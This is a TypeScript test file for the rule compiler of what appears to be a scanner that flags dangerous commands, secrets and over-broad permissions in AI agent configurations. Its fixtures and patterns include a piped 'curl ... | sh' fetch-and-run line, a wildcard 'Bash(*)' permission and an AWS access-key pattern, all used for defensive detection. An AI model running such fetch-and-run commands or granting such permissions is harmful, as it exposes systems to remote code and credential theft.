import { describe, it, expect } from 'vitest';
import { compileRule, compileRuleset } from '../compile.js';
import { RulesetError } from '../types.js';
import type { FileRecord, RuleSpec } from '../types.js';

const base = {
  detectionClass: 'dangerous-bash' as const,
  severity: 'high' as const,
  tier: 'T0' as const,
  framework: { owasp: 'ASI04', atlas: 'AML.T0050' },
  why: 'test',
  passFixtures: [],
  failFixtures: [],
  precisionBudget: 0,
};

const file = (content: string, kind: FileRecord['kind'] = 'script', path = 'a.sh'): FileRecord => ({
  path,
  content,
  kind,
});

describe('compileRule — line-pattern matcher (EARS-049)', () => {
  it('compiles a line-pattern source to a per-line regex matcher and cites the 1-based line', () => {
    const rule = compileRule({
      ...base,
      id: 'x/curl',
      matcher: { kind: 'line-pattern', pattern: 'curl[^|]*\\|\\s*sh' },
    });
    const matches = rule.detect(file('echo one\ncurl https://e.test/x | sh\n'));
    expect(matches).toEqual([{ line: 2, excerpt: 'curl https://e.test/x | sh' }]);
  });

  it('honours the appliesTo set — no match outside the listed kinds (EARS-049 unhappy)', () => {
    const rule = compileRule({
      ...base,
      id: 'x/scoped',
      matcher: { kind: 'line-pattern', pattern: 'Bash\\(\\*\\)', appliesTo: ['settings', 'mcp-config'] },
    });
    expect(rule.detect(file('"Bash(*)"', 'other'))).toEqual([]);
    expect(rule.detect(file('"Bash(*)"', 'settings'))).toHaveLength(1);
  });

  it('strips the global flag so per-line matching is stateless', () => {
    const rule = compileRule({
      ...base,
      id: 'x/g',
      matcher: { kind: 'line-pattern', pattern: 'AKIA[0-9A-Z]{16}', flags: 'g' },
    });
    expect(rule.detect(file('AKIAIOSFODNN7EXAMPLE\nAKIAIOSFODNN7EXAMPLE'))).toHaveLength(2);
  });

  it('rejects an invalid regex source at LOAD time with a typed RulesetError (EARS-052)', () => {
    const spec: RuleSpec = { ...base, id: 'x/bad', matcher: { kind: 'line-pattern', pattern: '(' } };
    expect(() => compileRule(spec)).toThrowError(RulesetError);
    try {
      compileRule(spec);
    } catch (e) {
      expect((e as RulesetError).code).toBe('INVALID_PATTERN');
      expect((e as RulesetError).ruleId).toBe('x/bad');
    }
  });
});

describe('compileRule — builtin matcher (EARS-050)', () => {
  it('resolves a builtin by name from the closed registry', () => {
    const rule = compileRule({
      ...base,
      id: 'x/mcp',
      detectionClass: 'over-broad-perms',
      matcher: { kind: 'builtin', name: 'mcp-combined-scopes' },
    });
    const hit = rule.detect(file('{ "s": ["filesystem","network","secret"] }', 'mcp-config', '.mcp.json'));
    expect(hit).toHaveLength(1);
  });

  it('narrows a builtin further when appliesTo is supplied', () => {
    const rule = compileRule({
      ...base,
      id: 'x/mcp-narrowed',
      detectionClass: 'over-broad-perms',
      // mcp-combined-scopes already only fires on mcp-config; an appliesTo excluding it yields nothing.
      matcher: { kind: 'builtin', name: 'mcp-combined-scopes', appliesTo: ['settings'] },
    });
    expect(rule.detect(file('{ "s": ["filesystem","network","secret"] }', 'mcp-config'))).toEqual([]);
  });

  it('rejects an unknown builtin name at LOAD time with a typed RulesetError (EARS-053)', () => {
    const spec = {
      ...base,
      id: 'x/unknown',
      matcher: { kind: 'builtin', name: 'no-such-matcher' },
    } as unknown as RuleSpec;
    expect(() => compileRule(spec)).toThrowError(RulesetError);
    try {
      compileRule(spec);
    } catch (e) {
      expect((e as RulesetError).code).toBe('UNKNOWN_BUILTIN');
      expect((e as RulesetError).ruleId).toBe('x/unknown');
      expect((e as RulesetError).message).toContain('no-such-matcher');
    }
  });
});

describe('compileRule — the ruleset is DATA, never executable code (EARS-051, abuse)', () => {
  it('treats a pattern source crafted to look like code as inert matching data', () => {
    // A pattern source that, if ever eval'd, would be a code-exec attempt. It must only ever be a
    // RegExp that matches the literal text — never run. Here it is a valid regex that matches nothing
    // dangerous; the point is no execution happens and the audit proceeds normally.
    const rule = compileRule({
      ...base,
      id: 'x/inert',
      matcher: { kind: 'line-pattern', pattern: 'process\\.exit\\(1\\)' },
    });
    // It matches the literal string in a file (as text), and does not terminate this process.
    const matches = rule.detect(file('const x = 1;\nprocess.exit(1)\n', 'script'));
    expect(matches).toEqual([{ line: 2, excerpt: 'process.exit(1)' }]);
    // The test reaching this assertion proves nothing in the rule data was executed.
    expect(true).toBe(true);
  });
});

describe('compileRuleset', () => {
  it('compiles an array of specs and surfaces a RulesetError from any bad member', () => {
    const good: RuleSpec = { ...base, id: 'ok', matcher: { kind: 'line-pattern', pattern: 'a' } };
    const bad: RuleSpec = { ...base, id: 'bad', matcher: { kind: 'line-pattern', pattern: '(' } };
    expect(compileRuleset([good])).toHaveLength(1);
    expect(() => compileRuleset([good, bad])).toThrowError(RulesetError);
  });
});
